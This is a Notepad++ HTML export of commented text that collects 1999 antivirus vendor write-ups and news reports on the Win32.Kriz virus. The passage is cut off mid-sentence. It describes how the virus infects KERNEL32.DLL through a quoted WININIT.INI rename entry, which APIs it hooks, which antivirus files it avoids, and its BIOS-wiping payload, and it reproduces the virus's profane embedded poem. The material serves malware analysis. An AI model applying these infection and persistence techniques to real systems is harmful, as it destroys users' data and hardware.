<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Fucked up descriptions:</span><span class="sc0">

</span><span class="sc1">; SYMANTEC</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; W32.KRIZ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;           Aliases: W32.Kriz.3863, W32.Kriz.3740</span><span class="sc0">
</span><span class="sc1">; Area of Infection: Windows 9x/NT PE files</span><span class="sc0">
</span><span class="sc1">;        Likelihood: Rare</span><span class="sc0">
</span><span class="sc1">;   Region Reported: Worldwide</span><span class="sc0">
</span><span class="sc1">;   Characteristics: Wild, BIOS, December 25</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Description:</span><span class="sc0">
</span><span class="sc1">; W32.Kriz is a Windows 9x/NT virus, which infects Portable Executable (PE)</span><span class="sc0">
</span><span class="sc1">; Windows files. The virus goes resident into memory, attempting to infect</span><span class="sc0">
</span><span class="sc1">; any files that are opened by the user or applications. If infected with</span><span class="sc0">
</span><span class="sc1">; this virus, the user should verify they have "booted clean" before</span><span class="sc0">
</span><span class="sc1">; attempting to scan and repair files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus also modifies the KERNEL32.DLL. This file must be replaced with</span><span class="sc0">
</span><span class="sc1">; a known, clean backup. In addition, this virus may corrupt some PE files,</span><span class="sc0">
</span><span class="sc1">; requiring them to be replaced by known, clean backups (or from the</span><span class="sc0">
</span><span class="sc1">; installation package).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The W32.Kriz virus also contains a payload, which is executed on December</span><span class="sc0">
</span><span class="sc1">; 25th.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The first time the virus is executed on a system, it will create an</span><span class="sc0">
</span><span class="sc1">; infected copy of KERNEL32.DLL in the Windows system directory. The file</span><span class="sc0">
</span><span class="sc1">; will be named KRIZED.TT6. If this file is found in the Windows system</span><span class="sc0">
</span><span class="sc1">; directory, it should be deleted. The next time Windows is started, this</span><span class="sc0">
</span><span class="sc1">; file will be copied over the original KERNEL32.DLL. Then, the virus infects</span><span class="sc0">
</span><span class="sc1">; other files when certain Windows API functions are called by a program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; There are variants of this virus. Some of the differences between variants</span><span class="sc0">
</span><span class="sc1">; pertain to the payload. The 3863 variant will access more types of drives</span><span class="sc0">
</span><span class="sc1">; when overwriting files. Other differences include the method of infection.</span><span class="sc0">
</span><span class="sc1">; The 3740 variant will create a new section named "…" and copy its viral</span><span class="sc0">
</span><span class="sc1">; code to that newly created section. The 3863 variant will simply append its</span><span class="sc0">
</span><span class="sc1">; code to the end of the last section.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Currently, only the 3863 variant has been found in the wild. There is a</span><span class="sc0">
</span><span class="sc1">; 3863.b version of this virus. It is the same as the 3863 variant except</span><span class="sc0">
</span><span class="sc1">; that some of the unused text at the end of the virus has been corrupted.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Payload:</span><span class="sc0">
</span><span class="sc1">; If the system date is December 25th, the virus will attempt to flash the</span><span class="sc0">
</span><span class="sc1">; BIOS of the computer. This will prevent the computer from booting up</span><span class="sc0">
</span><span class="sc1">; properly and may require a change of hardware. Information stored in the</span><span class="sc0">
</span><span class="sc1">; CMOS will be cleared. So the date, time, hard drive and floppy drive</span><span class="sc0">
</span><span class="sc1">; settings, peripheral configuration, etc. will need to be restored. The</span><span class="sc0">
</span><span class="sc1">; virus will also begin overwriting files on all available drives. This</span><span class="sc0">
</span><span class="sc1">; includes mapped network drives, floppy drives and RAM disks. This payload</span><span class="sc0">
</span><span class="sc1">; is very similar to W95.CIH.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Write-up by: Eric Chien</span><span class="sc0">
</span><span class="sc1">; September 1, 1999</span><span class="sc0">


</span><span class="sc1">; AVP</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; WIN32.KRIZ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It is a memory resident polymorphic Windows virus. It replicates under</span><span class="sc0">
</span><span class="sc1">; Windows32 systems and infects PE EXE files (Windows executable) with EXE</span><span class="sc0">
</span><span class="sc1">; and SCR filename extensions, as well as the Windows KERNEL32.DLL system</span><span class="sc0">
</span><span class="sc1">; library that allows the virus to stay memory resident during a whole</span><span class="sc0">
</span><span class="sc1">; Windows session. The virus in infected KERNEL32.DLL hooks files access</span><span class="sc0">
</span><span class="sc1">; functions, intercepts file copying, opening, moving, e.t.c. and infects</span><span class="sc0">
</span><span class="sc1">; files that are accessed. The virus checks file names and does not infect</span><span class="sc0">
</span><span class="sc1">; several anti-virus program files:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  _AVP32.EXE, _AVPM.EXE, ALERTSVC.EXE, AMON.EXE, AVP32.EXE, AVPM.EXE,</span><span class="sc0">
</span><span class="sc1">;  N32SCANW.EXE, NAVAPSVC.EXE, NAVAPW32.EXE, NAVLU32.EXE, NAVRUNR.EXE,</span><span class="sc0">
</span><span class="sc1">;  NAVWNT.EXE, NOD32.EXE, NPSSVC.EXE, NSCHEDNT.EXE, NSPLUGIN.EXE,</span><span class="sc0">
</span><span class="sc1">;  SCAN.EXE, SMSS.EXE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus has an extremely dangerous payload that is activated on December</span><span class="sc0">
</span><span class="sc1">; 25th. On this day when infecting any file (i.e. when they are accessed by</span><span class="sc0">
</span><span class="sc1">; any of the Windows functions listed below), the virus "kills" information</span><span class="sc0">
</span><span class="sc1">; stored in CMOS memory, overwrites data in all files on all available</span><span class="sc0">
</span><span class="sc1">; drives, and then messes-up the Flash BIOS by using the same routine that</span><span class="sc0">
</span><span class="sc1">; was found in the "Win95.CIH" virus (aka Chernobyl).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When an infected file is run, the virus' polymorphic decryption loop takes</span><span class="sc0">
</span><span class="sc1">; control and restores the virus code back to its original form. The virus</span><span class="sc0">
</span><span class="sc1">; then scans the Windows32 kernel, gets addresses of necessary Windows</span><span class="sc0">
</span><span class="sc1">; functions and calls the KERNEL32 infection routine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; While infecting a file the virus creates a new file section at the end of</span><span class="sc0">
</span><span class="sc1">; the file, encrypts and writes its code to there. To separate infected and</span><span class="sc0">
</span><span class="sc1">; not yet infected files the virus writes the "666" ID string to the PE file</span><span class="sc0">
</span><span class="sc1">; header reserved field. The virus section has the "..." name.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; While infecting the KERNEL32.DLL module the virus also patches its Export</span><span class="sc0">
</span><span class="sc1">; table (exported functions) and modifies several functions' addresses so,</span><span class="sc0">
</span><span class="sc1">; that on next Windows startup the calls to KERNEL32 function will be</span><span class="sc0">
</span><span class="sc1">; filtered by virus hookers. That allows the virus to monitor file access</span><span class="sc0">
</span><span class="sc1">; calls.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus hooks 16 KERNEL32 functions - file opening, copying, deleting,</span><span class="sc0">
</span><span class="sc1">; reading/writing file attributes, creating a new process. The complete list</span><span class="sc0">
</span><span class="sc1">; of hooked functions looks as follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  CopyFileA CopyFileW</span><span class="sc0">
</span><span class="sc1">;  CreateFileA CreateFileW</span><span class="sc0">
</span><span class="sc1">;  DeleteFileA DeleteFileW</span><span class="sc0">
</span><span class="sc1">;  MoveFileA MoveFileExA MoveFileW MoveFileExW</span><span class="sc0">
</span><span class="sc1">;  GetFileAttributesA SetFileAttributesW</span><span class="sc0">
</span><span class="sc1">;  SetFileAttributesA SetFileAttributesExA</span><span class="sc0">
</span><span class="sc1">;  CreateProcessA CreateProcessW</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To infect the KERNEL32.DLL file that can be opened in read-only more only,</span><span class="sc0">
</span><span class="sc1">; the virus uses a standard trick. It copies this file with temporary name</span><span class="sc0">
</span><span class="sc1">; (this copy has KRIZED.TT6 name and it is created in the Windows system</span><span class="sc0">
</span><span class="sc1">; directory), infects it and writes "rename" instruction to the WININIT.INI</span><span class="sc0">
</span><span class="sc1">; file. This trick allows the virus to infect the copy of KERNEL32.DLL and</span><span class="sc0">
</span><span class="sc1">; force Windows to replace the original KERNEL32.DLL with infected copy on</span><span class="sc0">
</span><span class="sc1">; next startup.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus contains internal text strings that are not used in any way:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  =( [c] 1999 [t] )=</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  YOU CALL IT RELIGION, YOU'RE FULL OF SHIT</span><span class="sc0">
</span><span class="sc1">;  YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL</span><span class="sc0">
</span><span class="sc1">;  YOU'RE SO FULL OF SHIT, I DON'T WANT TO HEAR IT</span><span class="sc0">
</span><span class="sc1">;  ALL YOU DO IS TALK ABOUT YOURSELF</span><span class="sc0">
</span><span class="sc1">;  I DON'T WANNA HEAR IT, COZ I KNOW NONE OF IT'S TRUE</span><span class="sc0">
</span><span class="sc1">;  I'M SICK AND TIRED OF ALL YOUR GODDAMN LIES</span><span class="sc0">
</span><span class="sc1">;  LIES IN THE NAME OF GOD</span><span class="sc0">
</span><span class="sc1">;  WHEN ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT?!</span><span class="sc0">
</span><span class="sc1">;  I KNOW YOU'RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH</span><span class="sc0">
</span><span class="sc1">;  YOU KEEP ON TALKING, TALKING EVERYDAY</span><span class="sc0">
</span><span class="sc1">;  FIRST YOU'RE TELLING STORIES, THEN YOU'RE TELLING LIES</span><span class="sc0">
</span><span class="sc1">;  WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT!!</span><span class="sc0">
</span><span class="sc1">;  AH, SHUT THE FUCK UP...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; KRIZ.3862</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus version is very closely related to the original one and differs</span><span class="sc0">
</span><span class="sc1">; only by additional programming tricks, another "copyright" text string:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  (c) T2 &amp; Immortal Riot</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; and an improved disk erasing routine: in addition to erasing CMOS, Flash</span><span class="sc0">
</span><span class="sc1">; and files on logical drives this virus enumerates all available network</span><span class="sc0">
</span><span class="sc1">; drives and erases all files on them. While erasing files the virus</span><span class="sc0">
</span><span class="sc1">; truncates them and overwrites them with the "DEAD BEEF" hexadecimal string</span><span class="sc0">
</span><span class="sc1">; (DEADBEEFh).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; KRIZ.4029</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus version is very closely related to the previous one</span><span class="sc0">
</span><span class="sc1">; ("Kriz.3836"). The differences are: some routines were improved; the</span><span class="sc0">
</span><span class="sc1">; destruction routine is also activated if the SoftIce debugger is installed</span><span class="sc0">
</span><span class="sc1">; in the system; the "copyright" text was also changed:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  T-2000 / Immortal Riot</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Text added: June-30-1999</span><span class="sc0">
</span><span class="sc1">; New variant Win32.Kriz.3862: August-18-1999</span><span class="sc0">
</span><span class="sc1">; More information about Kriz.3862 added: August-23-1999</span><span class="sc0">
</span><span class="sc1">; Kriz.4029 desc. added: September-05-1999</span><span class="sc0">


</span><span class="sc1">; PANDA</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; CMOS AND FLASH MEMORIES: PRIME OBJECTIVES OF WIN32.KRIZ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Panda detects and eliminates this virus, and it is the only developer</span><span class="sc0">
</span><span class="sc1">; capable of disinfecting the Kernel32.DLL library file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; SAN FRANCISCO, August, 27th, 1999 -- Win32.Kriz is a resident polymorphic</span><span class="sc0">
</span><span class="sc1">; virus that runs under all Win32 platforms (Windows 95, Windows 98 and</span><span class="sc0">
</span><span class="sc1">; Windows NT) and infects Windows executable files (EXE extensions), screen</span><span class="sc0">
</span><span class="sc1">; saver files (SCR extensions) and the KERNEL32.DLL system library. Although</span><span class="sc0">
</span><span class="sc1">; its polymorphic generation routine is quite simple, the virus hides several</span><span class="sc0">
</span><span class="sc1">; programming tricks up its sleeve to complicate its debugging.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Kriz's destructive payload is produced on the 25th of December. If,</span><span class="sc0">
</span><span class="sc1">; on that day, more than 256 infected EXE or SCR files have been accessed,</span><span class="sc0">
</span><span class="sc1">; the virus deletes the CMOS memory (which contains, among other information,</span><span class="sc0">
</span><span class="sc1">; data concerning the date, time, type of hard disk, etc.), damages the FLASH</span><span class="sc0">
</span><span class="sc1">; memory and overwrites all files contained in any network drive.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The first time a file infected by Win32.Kriz is executed in a clean system,</span><span class="sc0">
</span><span class="sc1">; the polymorphic routines takes over and decrypts the remaining virus code</span><span class="sc0">
</span><span class="sc1">; in order to subsequently scan the resident area of KERNEL32 to locate the</span><span class="sc0">
</span><span class="sc1">; addresses of the following API's:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; CopyFileA, CreateFileA, CreateProcessA, DeleteFileA, GetFileAttributesA,</span><span class="sc0">
</span><span class="sc1">; MoveFileA, MoveFileExA, SetFileAttributesA, CopyFileW, CreateFileW,</span><span class="sc0">
</span><span class="sc1">; CreateProcessW, DeleteFileW, GetFileAttributesW, MoveFileW, MoveFileExW,</span><span class="sc0">
</span><span class="sc1">; SetFileAttributesW, CloseHandle, CreateFileMappingA, FindClose,</span><span class="sc0">
</span><span class="sc1">; FindFirstFileA, FindNextFileA, FreeLibrary, GetCurrentDirectory,</span><span class="sc0">
</span><span class="sc1">; GetDriveTypeA, GetFileSize, GetLocalTime, GetLogicalDriveStringsA,</span><span class="sc0">
</span><span class="sc1">; GetProcAddress, GetSystemDirectoryA, GetTickCount, GetWindowsDirectory,</span><span class="sc0">
</span><span class="sc1">; GlobalAlloc, GlobalFree, LoadLibraryA, MapViewOfFile, SetCurrentDirectory,</span><span class="sc0">
</span><span class="sc1">; SetFileTime, UnmapViewOfFile, WriteFile, WritePrivateProfile.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus calculates the CRC16 of the name of the APIs that the KERNEL32</span><span class="sc0">
</span><span class="sc1">; exports and compares them with the list of the ones it needs to</span><span class="sc0">
</span><span class="sc1">; subsequently infect the KERNEL32.DLL file. It then overwrites the position</span><span class="sc0">
</span><span class="sc1">; of these APIs with the corresponding addresses of the viral routines.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Kriz copies the KERNEL32.DLL file (from the c:\windows\system</span><span class="sc0">
</span><span class="sc1">; directory), renames it as KRIZED.TT6 and infects it, calculating the file's</span><span class="sc0">
</span><span class="sc1">; checksum correctly so that it does not generate any execution problems</span><span class="sc0">
</span><span class="sc1">; under Windows NT. Once the KRIZED.TT6 temp file has been infected, the</span><span class="sc0">
</span><span class="sc1">; virus creates a WININIT.INI file that automatically replaces the original</span><span class="sc0">
</span><span class="sc1">; KERNEL32.DLL file with the new infected copy. This way, upon the next</span><span class="sc0">
</span><span class="sc1">; system startup, Win32.Kriz will remain resident throughout the entire</span><span class="sc0">
</span><span class="sc1">; session, even if no other infected file is executed. In the first session,</span><span class="sc0">
</span><span class="sc1">; the virus is not resident in memory and will not infect any files as long</span><span class="sc0">
</span><span class="sc1">; as the system is not restarted. Then, when the system is booted with an</span><span class="sc0">
</span><span class="sc1">; infected copy of the KERNEL32.DLL file, Win32.Kriz will attack any file</span><span class="sc0">
</span><span class="sc1">; that is accessed (upon copying, moving, running, creating or attribute</span><span class="sc0">
</span><span class="sc1">; modification) after the APIs that were intercepted are called.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Kriz contains the following text:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  (c) T2 &amp; Immortal Riot</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  YOU CALL IT RELIGION, YOU'RE FULL OF SHIT</span><span class="sc0">
</span><span class="sc1">;  YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL</span><span class="sc0">
</span><span class="sc1">;  YOU'RE SO FULL OF SHIT, I DON'T WANT TO HEAR IT</span><span class="sc0">
</span><span class="sc1">;  ALL YOU DO IS TALK ABOUT YOURSELF</span><span class="sc0">
</span><span class="sc1">;  I DON'T WANNA HEAR IT, COZ I KNOW NONE OF IT'S TRUE</span><span class="sc0">
</span><span class="sc1">;  I'M SICK AND TIRED OF ALL YOUR GODDAMN LIES</span><span class="sc0">
</span><span class="sc1">;  LIES IN THE NAME OF GOD</span><span class="sc0">
</span><span class="sc1">;  WHEN ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT?!</span><span class="sc0">
</span><span class="sc1">;  I KNOW YOU'RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH</span><span class="sc0">
</span><span class="sc1">;  YOU KEEP ON TALKING, TALKING EVERYDAY</span><span class="sc0">
</span><span class="sc1">;  FIRST YOU'RE TELLING STORIES, THEN YOU'RE TELLING LIES</span><span class="sc0">
</span><span class="sc1">;  WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT!!</span><span class="sc0">
</span><span class="sc1">;  AH, SHUT THE FUCK UP...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Panda detects and eliminates Win32.Kriz, thereby protecting users against</span><span class="sc0">
</span><span class="sc1">; this virus, which is a harmful threat to their systems. In addition, Panda</span><span class="sc0">
</span><span class="sc1">; is the only antivirus developer capable of disinfecting the Kernel32.DLL</span><span class="sc0">
</span><span class="sc1">; library file. For this, the computer must be booted in MS-DOS mode, since</span><span class="sc0">
</span><span class="sc1">; the affected files are used by Windows upon computer startup.</span><span class="sc0">


</span><span class="sc1">; NAI</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; VIRUS NAME</span><span class="sc0">
</span><span class="sc1">; W32/Kriz.3862</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DATE ADDED</span><span class="sc0">
</span><span class="sc1">; 8/16/99</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; VIRUS CHARACTERISTICS</span><span class="sc0">
</span><span class="sc1">; This is Windows 95/98 and NT virus that infects PE EXE files. It is also</span><span class="sc0">
</span><span class="sc1">; polymorphic. When an infected file is executed, this virus will stay</span><span class="sc0">
</span><span class="sc1">; resident in memory until the next time the system is rebooted. This virus</span><span class="sc0">
</span><span class="sc1">; encrypts its code, leaving only a small random decryptor. This virus will</span><span class="sc0">
</span><span class="sc1">; infect files as they are opened by any application while it is in memory.</span><span class="sc0">
</span><span class="sc1">; This will occur when a user scans files as well.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus also has a payload which activates when an infected file is run</span><span class="sc0">
</span><span class="sc1">; on December 25th. When it does it will attempt To erase the computer's CMOS</span><span class="sc0">
</span><span class="sc1">; information, which contains information such as date and time, and the type</span><span class="sc0">
</span><span class="sc1">; of hard disk the computer uses. This virus will also attempt to directly</span><span class="sc0">
</span><span class="sc1">; erase disk sectors. It will attempt to flash the BIOS with garbage. This</span><span class="sc0">
</span><span class="sc1">; only works on certain types of BIOSes. If this succeeds, the computer will</span><span class="sc0">
</span><span class="sc1">; not boot. This is similar to the action taken by the CIH virus. If the</span><span class="sc0">
</span><span class="sc1">; virus is successful the computer will not boot up, not even from a floppy</span><span class="sc0">
</span><span class="sc1">; disk. In some cases the virus will corrupt the file it infects and cleaning</span><span class="sc0">
</span><span class="sc1">; may not be possible.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus will infect kernel32.dll. When it does, it replaces the original</span><span class="sc0">
</span><span class="sc1">; contents with it owns. Because of this the file can NOT be repaired, it</span><span class="sc0">
</span><span class="sc1">; must be replaced.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus code also contains a poem that contains quite a bit of</span><span class="sc0">
</span><span class="sc1">; profanity. It is never displayed, nor is it used in any of the routines</span><span class="sc0">
</span><span class="sc1">; it runs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; INDICATIONS OF INFECTION</span><span class="sc0">
</span><span class="sc1">; Not Available...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; METHOD OF INFECTION</span><span class="sc0">
</span><span class="sc1">; When first run on a clean machine, the virus checks KERNEL32.DLL to see if</span><span class="sc0">
</span><span class="sc1">; it is infected, if yes then the virus exits. If KERNEL32.DLL is not</span><span class="sc0">
</span><span class="sc1">; infected then the virus copies KERNEL32.DLL to WINDOWS\SYSTEM\KRIZED.TT6</span><span class="sc0">
</span><span class="sc1">; and then the virus infects this local copy. The virus then creates the file</span><span class="sc0">
</span><span class="sc1">; WINDOWS\WININIT.INI containing the lines :-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  [rename]</span><span class="sc0">
</span><span class="sc1">;  C:\WINDOWS\SYSTEM\KERNEL32.DLL=C:\WINDOWS\SYSTEM\KRIZED.TT6</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This causes windows to replace KERNEL32.DLL with the infected copy when the</span><span class="sc0">
</span><span class="sc1">; system is next re-started.  In the infected copy of KERNEL32.DLL the virus</span><span class="sc0">
</span><span class="sc1">; hooks the following functions :-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  CopyFileA</span><span class="sc0">
</span><span class="sc1">;  CopyFileW</span><span class="sc0">
</span><span class="sc1">;  CreateFileA</span><span class="sc0">
</span><span class="sc1">;  CreateFileW</span><span class="sc0">
</span><span class="sc1">;  CreateProcessA</span><span class="sc0">
</span><span class="sc1">;  CreateProcessW</span><span class="sc0">
</span><span class="sc1">;  DeleteFileA</span><span class="sc0">
</span><span class="sc1">;  DeleteFileW</span><span class="sc0">
</span><span class="sc1">;  GetFileAttributesA</span><span class="sc0">
</span><span class="sc1">;  GetFileAttributesW</span><span class="sc0">
</span><span class="sc1">;  MoveFileA</span><span class="sc0">
</span><span class="sc1">;  MoveFileW</span><span class="sc0">
</span><span class="sc1">;  MoveFileExA</span><span class="sc0">
</span><span class="sc1">;  MoveFileExW</span><span class="sc0">
</span><span class="sc1">;  SetFileAttributesA</span><span class="sc0">
</span><span class="sc1">;  SetFileAttributesW</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This causes any PE executable file that is run, copied, moved or scanned to</span><span class="sc0">
</span><span class="sc1">; be infected by the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; VIRUS INFORMATION</span><span class="sc0">
</span><span class="sc1">;      DISCOVERY DATE: 8/16/99</span><span class="sc0">
</span><span class="sc1">;                TYPE: Win32</span><span class="sc0">
</span><span class="sc1">;     RISK ASSESSMENT: medium-AvertWatch List</span><span class="sc0">
</span><span class="sc1">;         MINIMUM DAT: 4039</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; VARIANTS</span><span class="sc0">
</span><span class="sc1">; Unknown</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ALIASES</span><span class="sc0">
</span><span class="sc1">; Kriz</span><span class="sc0">


</span><span class="sc1">; ZDNN (some PC news site)</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; 'CHRISTMAS' VIRUS CAN DESTROY PCs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; New virus set to hit Dec. 25, delivering a payload that can kill a Windows</span><span class="sc0">
</span><span class="sc1">; PC's BIOS. Is it as bad as CIH?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; By Bob Sullivan, MSNBC</span><span class="sc0">
</span><span class="sc1">; August 18, 1999 3:00 PM PT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A nasty new virus discovered by researchers promises to do even more damage</span><span class="sc0">
</span><span class="sc1">; to victims than the Chernobyl virus. It has the ability not only to erase</span><span class="sc0">
</span><span class="sc1">; files, but also to render a PC useless by destroying its flash BIOS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The good news is it won't execute until Dec. 25; the bad news is PC users</span><span class="sc0">
</span><span class="sc1">; without anti-virus programs may have a very bad Christmas Day.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The author of Win32.Kriz, discovered recently by researchers, sounds as if</span><span class="sc0">
</span><span class="sc1">; he or she has an ax to grind against religious folks.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Inside the virus is a text string with a poem full of expletives</span><span class="sc0">
</span><span class="sc1">; criticizing those who preach religion: "I don't wanna hear it, coz I know</span><span class="sc0">
</span><span class="sc1">; none of it's true," the author writes, according to anti-virus research</span><span class="sc0">
</span><span class="sc1">; firm Kaspersky Lab.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Victims of the virus -- who can be anyone using Windows 95, Windows 98 or</span><span class="sc0">
</span><span class="sc1">; Windows NT -- can expect a load of trouble. The virus kills the CMOS</span><span class="sc0">
</span><span class="sc1">; memory, overwrites data in all files on all available drives, and then</span><span class="sc0">
</span><span class="sc1">; destroys the flash BIOS by using the same routine that was found in the</span><span class="sc0">
</span><span class="sc1">; "Win95_CIH" virus, also known as Chernobyl.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "This is a nasty one, very well written," said Dan Takata of anti-virus</span><span class="sc0">
</span><span class="sc1">; vendor Data Fellows Inc.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; He said it's too early to tell if the virus will be widespread -- but</span><span class="sc0">
</span><span class="sc1">; potential victims have until Dec. 25 to update their antivirus programs</span><span class="sc0">
</span><span class="sc1">; against it.</span><span class="sc0">


</span><span class="sc1">; AVP PRESS</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; New Windows Virus Named Win32.Kriz.3740 Discovered</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Attacks Executable and Screen Saver Files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Medina, OH August 18, 1999 -- Central Command and Kaspersky Lab announce</span><span class="sc0">
</span><span class="sc1">; the discovery of a new Windows virus that contains same destructive payload</span><span class="sc0">
</span><span class="sc1">; as the Chernobyl virus that rendered thousands of computers in Asia</span><span class="sc0">
</span><span class="sc1">; unusable.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Named Win32.Kriz.3740, the virus contains even more deadly capacity than</span><span class="sc0">
</span><span class="sc1">; the original Chernobyl virus. The Win32.Kriz.3740 virus, on December 25th,</span><span class="sc0">
